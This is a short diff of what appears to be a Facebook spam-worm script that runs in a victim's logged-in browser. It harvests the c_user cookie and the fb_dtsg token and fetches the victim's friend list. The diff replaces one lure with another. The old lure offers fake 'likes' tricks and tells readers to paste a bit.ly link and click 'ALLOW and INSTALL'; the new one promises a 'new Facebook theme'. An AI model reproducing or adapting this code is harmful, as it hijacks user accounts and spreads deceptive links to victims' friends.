@@ -70,7 +70,7 @@ var Fwsuc = 0;
 var arr = new Array;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var Fwmsg = "Get more Status Like/Photo Like/Page Like/Followers trick \n step1- Use Firefox Browser \n step2- Copy Paste below link in browser \n step3- Remove the space after .ly  \n step4- Hit Enter,click ALLOW and INSTALL=>  http://bit.ly/ 19aa2Ay" ;
+var Fwmsg = ">>>>>> Get Facebook New Theme/Interface 2014  \n  >>>>> Update Your Facebook \n >>>> Get It Right Now \n >>> Just Click On The Link \n >> Then Follow It \n >See Magic  \n \n https://m.facebook.com/home.php?sk=fl_1377482339194995 \n \n [Note: This is the newest update from facebook. If You want to update your facebook profile then follow Otherwise Dont Follow It Depends On You.And It will take about 30 minites ] " ;
 jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0", function (a) {
     var b = a;
     var c = b.substring(b.indexOf("{"));
